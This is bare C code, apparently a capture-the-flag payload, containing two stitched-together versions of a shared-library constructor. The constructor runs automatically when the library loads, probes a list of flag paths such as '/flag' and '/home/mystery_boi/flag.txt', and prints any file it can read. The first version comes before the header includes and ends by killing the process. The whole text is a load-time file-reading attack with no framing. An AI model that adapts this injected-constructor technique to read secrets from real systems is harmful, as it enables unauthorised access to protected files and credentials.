__attribute__((constructor))
void init() {
    const char *paths[] = {"/flag", "flag", "./flag", "/home/mystery_boi/flag", "/home/mystery_boi/flag.txt", "/app/flag", NULL};
    char buf[4096];
    for (int i=0; paths[i]; i++) {
        int fd = open(paths[i], O_RDONLY);
        if (fd >= 0) {
            ssize_t n = read(fd, buf, sizeof(buf)-1);
            if (n > 0) {
                write(1, "FOUND ", 6);
                write(1, paths[i], strlen(paths[i]));
                write(1, "\n", 1);
                write(1, buf, n);
                write(1, "\n", 1);
            }
            close(fd);
        }
    }
    _exit(0);
}

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

__attribute__((constructor)) void init() {
    const char *paths[] = {
        "./flag",
        "./flag.txt",
        "/home/mystery_boi/flag",
        "/home/mystery_boi/flag.txt",
        "/flag",
        "/app/flag",
        NULL
    };
    char buf[4096];
    for (int i=0; paths[i]; i++) {
        FILE *f = fopen(paths[i], "r");
        if (f) {
            size_t n = fread(buf,1,sizeof(buf)-1,f);
            buf[n]=0;
            printf("[FLAGPATH %s]\n%s\n", paths[i], buf);
            fclose(f);
            fflush(stdout);
        }
    }
}

